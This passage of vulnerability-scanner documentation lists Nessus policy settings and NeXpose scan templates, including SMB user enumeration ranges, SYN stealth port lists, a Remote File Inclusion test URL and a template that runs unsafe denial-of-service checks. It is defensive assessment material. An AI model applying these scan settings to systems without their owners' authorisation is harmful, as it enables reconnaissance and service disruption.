<tr class="row-even"><td>Local distribution</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>No archive</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Nikto (NASL wrapper)</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Enable Nikto</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Disable if server never replies 404</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Root directory</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Pause between tests (s)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Scan CGI directories</td>
<td>User supplied</td>
</tr>
<tr class="row-odd"><td>Display: 1 Show redirects</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Display: 2 Show cookies received</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Display: 3 Show all 200/OK responses</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Display: 4 Show URLs which require authentication</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Display: V Verbose Output</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Tuning: 1 Interesting File/Seen in logs</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Tuning: 2 Misconfiguration / Default File</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Tuning: 3 Information Disclosure</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Tuning: 4 Injection (XSS/Script/HTML)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Oracle Settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Oracle SID</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Test default accounts (slow)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>PCI DSS Compliance</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Check for PCI-DSS compliance</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Ping the remote host</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>TCP ping destination port(s)</td>
<td>Built-in</td>
</tr>
<tr class="row-even"><td>Do an ARP ping</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Do a TCP ping</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Do an ICMP ping</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Number of Retries (ICMP)</td>
<td>2</td>
</tr>
<tr class="row-even"><td>Do an applicative UDP ping (DNS, RPCÖ)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Make the dead hosts appear in the report</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Log live hosts in the report</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Test the local Nessus host</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Fast network discovery</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port scanners settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Check open TCP ports found by local port enumerators</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Only run network port scanners if local port enumeration failed</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB Registry: Start the Registry Service during the scan</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start the Registry Service during the scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>SMB Scope</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Request information about the domain</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB use domain SID to enumerate users</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start UID</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>End UID</td>
<td>1200</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB use host SID to enumerate local users</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start UID</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>End UID</td>
<td>1200</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMTP settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Third party domain</td>
<td>Example.com</td>
</tr>
<tr class="row-even"><td>From address</td>
<td><a class="reference external" href="mailto:nobody&#37;&#52;&#48;example&#46;com">nobody<span>&#64;</span>example<span>&#46;</span>com</a></td>
</tr>
<tr class="row-odd"><td>To address</td>
<td>postmaster&#64;[AUTO_REPLACED_IP]</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>SNMP settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Community name</td>
<td>Public</td>
</tr>
<tr class="row-odd"><td>UDP port</td>
<td>161</td>
</tr>
<tr class="row-even"><td>SNMPv3 user name</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SNMPv3 authentication password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SNMPv3 authentication algorithm</td>
<td>MD5</td>
</tr>
<tr class="row-odd"><td>SNMPv3 privacy password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SNMPv3 privacy algorithm</td>
<td>DES</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Service Detection</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Test SSL based services</td>
<td>Known SSL ports</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Unix Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Web Application Tests Settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Enable web applications tests</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Maximum run time (min)</td>
<td>1</td>
</tr>
<tr class="row-odd"><td>Send POST requests</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Combinations of arguments values</td>
<td>one value</td>
</tr>
<tr class="row-odd"><td>HTTP Parameter Pollution</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Stop at first flaw</td>
<td>Per port (quicker)</td>
</tr>
<tr class="row-odd"><td>Test embedded web servers</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>URL for Remote File Inclusion</td>
<td><a class="reference external" href="http://rfi.nessus.org/rfi.txt">http://rfi.nessus.org/rfi.txt</a></td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Web mirroring</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Number of pages to mirror</td>
<td>0</td>
</tr>
<tr class="row-even"><td>Maximum depth</td>
<td>0</td>
</tr>
<tr class="row-odd"><td>Start page</td>
<td>/</td>
</tr>
<tr class="row-even"><td>Excluded items regex</td>
<td><div class="first last line-block">
<div class="line">*</div>
</div>
</td>
</tr>
<tr class="row-odd"><td>Follow dynamic pages</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Windows Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Windows File Contents Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #5</td>
<td>Blank</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="denial-of-service">
<h2>Denial of service<a class="headerlink" href="#denial-of-service" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This basic audit of all network assets uses both safe
and unsafe (denial-of-service) checks. This scan does not include
in-depth patch/hotfix checking, policy compliance checking, or
application-layer auditing.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;You can run a denial of service scan in a
preproduction environments to test the resistance of assets to denial-of
service conditions.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;80</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;Local, patch, policy check
types</p>
</div>
<div class="section" id="discovery-scan">
<h2>Discovery scan<a class="headerlink" href="#discovery-scan" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This scan locates live assets on the network and
identifies their host names and operating systems. NeXpose does not
perform enumeration, policy, or vulnerability scanning with this
template.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;You can run a discovery scan to compile a
complete list of all network assets. Afterward, you can target subsets
of these assets for intensive vulnerability scans, such as with the
Exhaustive scan template.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/N</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;21, 22, 23, 25, 80, 88, 110,
111, 135, 139, 143, 220, 264, 389, 443, 445, 449, 524, 585, 636, 993,
995, 1433, 1521, 1723, 3389, 8080, 9100</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery:
&#8216;&#8217;&#8216;53,67,111,135,137,161,500,1701</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 2 retries, 3000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;21, 22, 23, 25, 80, 110, 139, 143,220, 264,
443, 445, 449, 524, 585, 993, 995, 1433, 1521, 1723, 8080, 9100</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 25 blocks, 500 ms
block delay, 3 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;161, 500</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="discovery-scan-aggressive">
<h2>Discovery scan (aggressive)<a class="headerlink" href="#discovery-scan-aggressive" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This fast, cursory scan locates live assets on
high-speed networks and identifies their host names and operating
systems. NeXpose sends packets at a very high rate, which may trigger
IPS/IDS sensors, SYN flood protection, and exhaust states on stateful
firewalls. NeXpose does not perform enumeration, policy, or
vulnerability scanning with this template.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;This template is identical in scope to the
discovery scan, except that it uses more threads and is, therefore, much
faster. The tradeoff is that scans run with this template may not be as
thorough as with the Discovery scan template.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/N</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;25</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;21, 22, 23, 25, 80, 88, 110,
111, 135, 139, 143, 220, 264, 389, 443, 445, 449, 524, 585, 636, 993,
995, 1433, 1521, 1723, 3389, 8080, 9100</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;53, 67, 111, 135, 137, 161,
500, 1701</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;0 ms send delay, 2 retries, 3000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;21, 22, 23, 25, 80, 110, 139, 143, 220, 264,
443, 445, 449, 524, 585, 993, 995, 1433, 1521, 1723, 8080, 9100</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 25 blocks, 500 ms
block delay, 3 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;161, 500</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;25</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="exhaustive">
<h2>Exhaustive<a class="headerlink" href="#exhaustive" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This thorough network scan of all systems and
services uses only safe checks, including patch/hotfix inspections,
policy compliance assessments, and application-layer auditing. This scan
could take several hours, or even days, to complete, depending on the
number of target assets.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Scans run with this template are thorough,
but slow. Use this template to run intensive scans targeting a low
number of assets.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>I&#8217;&#8216;&#8217;CMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;80</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;NeXpose determines optimal method</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;21, 23, 25, 80, 110, 111, 135, 139, 443, 445,
449, 8080</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;All possible (1-65535)</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="full-audit">
<h2>Full audit<a class="headerlink" href="#full-audit" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This full network audit of all systems uses only safe
checks, including network-based vulnerabilities, patch/hotfix checking,
and application-layer auditing. NeXpose scans only default ports and
disables policy checking, which makes scans faster than with the
Exhaustive scan. Also, NeXpose does not check for potential
vulnerabilities with this template.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;This is the default NeXpose scan template.
Use it to run a fast, thorough vulnerability scan right &#8220;out of the
box.&#8221;</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;80</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers + 1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;Policy check type</p>
</div>
<div class="section" id="hipaa-compliance">
<h2>HIPAA compliance<a class="headerlink" href="#hipaa-compliance" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;NeXpose uses safe checks in this audit of compliance
with HIPAA section 164.312 (&#8220;Technical Safeguards&#8221;). The scan will flag
any conditions resulting in inadequate access control, inadequate
auditing, loss of integrity, inadequate authentication, or inadequate
transmission security (encryption) .</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan assets in a
HIPAA-regulated environment, as part of a HIPAA compliance program.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;80</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well known numbers +</p>
<p>1-1040</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="internet-dmz-audit">
<h2>Internet DMZ audit<a class="headerlink" href="#internet-dmz-audit" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This penetration test covers all common Internet
services, such as Web, FTP, mail (SMTP/POP/IMAP/Lotus Notes), DNS,
database, Telnet, SSH, and VPN. NeXpose does not perform in-depth
patch/hotfix checking and policy compliance audits will not be
performed.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan assets in your
DMZ.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;N</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;Well-known numbers</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;DNS, database, FTP, Lotus Notes/Domino, Mail, SSH, TFTP,
Telnet, VPN, Web check categories</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="linux-rpms">
<h2>Linux RPMs<a class="headerlink" href="#linux-rpms" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This scan verifies proper installation of RPM patches
on Linux systems. For optimum success, use administrative credentials.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to scan assets running
the Linux operating system.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum &#8216;&#8217;&#8216;# scan threads: 10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;22, 23</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;22, 23</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;RPM check type</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="microsoft-hotfix">
<h2>Microsoft hotfix<a class="headerlink" href="#microsoft-hotfix" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This scan verifies proper installation of hotfixes
and service packs on Microsoft Windows systems. For optimum success, use
administrative credentials.</p>
<p>&#8216;&#8217;&#8216;Why use this template: &#8216;&#8217;&#8216;Use this template to verify that assets
running Windows have hotfix patches installed on them.</p>
<p>&#8216;&#8217;&#8216;Device/vulnerability scan: &#8216;&#8217;&#8216;Y/Y</p>
<p>&#8216;&#8217;&#8216;Maximum # scan threads: &#8216;&#8217;&#8216;10</p>
<p>&#8216;&#8217;&#8216;ICMP (Ping hosts): &#8216;&#8217;&#8216;Y</p>
<p>&#8216;&#8217;&#8216;TCP ports used for device discovery: &#8216;&#8217;&#8216;135, 139, 445, 1433, 2400</p>
<p>&#8216;&#8217;&#8216;UDP ports used for device discovery: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Device discovery performance: &#8216;&#8217;&#8216;5 ms send delay, 4 retries, 1000 ms
block timeout</p>
<p>&#8216;&#8217;&#8216;TCP port scan method: &#8216;&#8217;&#8216;Stealth scan (SYN)</p>
<p>&#8216;&#8217;&#8216;TCP optimizer ports: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;TCP ports to scan: &#8216;&#8217;&#8216;135, 139, 445, 1433, 2433</p>
<p>&#8216;&#8217;&#8216;TCP port scan performance: &#8216;&#8217;&#8216;0 ms send delay, 10 blocks, 10 ms block
delay, 5 retries</p>
<p>&#8216;&#8217;&#8216;UDP ports to scan: &#8216;&#8217;&#8216;None</p>
<p>&#8216;&#8217;&#8216;Simultaneous port scans: &#8216;&#8217;&#8216;5</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks enabled (which disables all other
checks): &#8216;&#8217;&#8216;Microsoft hotfix check type</p>
<p>&#8216;&#8217;&#8216;Specific vulnerability checks disabled: &#8216;&#8217;&#8216;None</p>
</div>
<div class="section" id="payment-card-industry-pci-audit">
<h2>Payment Card Industry (PCI) audit<a class="headerlink" href="#payment-card-industry-pci-audit" title="Permalink to this headline">¶</a></h2>
<p>&#8216;&#8217;&#8216;Description: &#8216;&#8217;&#8216;This audit of Payment Card Industry (PCI) compliance
uses only safe checks, including network-based vulnerabilities,
patch/hotfix verification, and application-layer testing. NeXpose scans
all TCP ports and well-known UDP ports. NeXpose does not perform policy
checks.</p>
